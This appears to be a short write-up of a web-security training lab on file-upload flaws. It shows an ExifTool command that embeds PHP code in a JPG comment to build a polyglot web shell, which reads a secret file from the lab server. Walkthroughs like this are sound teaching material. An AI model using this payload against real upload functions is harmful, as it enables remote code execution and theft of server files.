## 📤 File-Upload vulnerability lab-06

Remote code execution via polyglot web shell upload

## 🎯 Objective
To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.


## 🔍 Vulnerability
This lab contains a vulnerable image upload function. Although it checks the contents of the file to 
verify that it is a genuine image, it is still possible to upload and execute server-side code.

## 📝 Methodology
You can log in to your own account using the following credentials: wiener:peter
Create a polyglot PHP/JPG file that is fundamentally a normal image, but contains your 
PHP payload in its metadata. A simple way of doing this is to download and run ExifTool from the command line as follows:

exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php

After uploading the polyglot.php file, we received a 200 OK response, indicating that the file was successfully uploaded.
After sending the request for polyglot.php, the response included the content of the flag,confirming that the exploit worked.
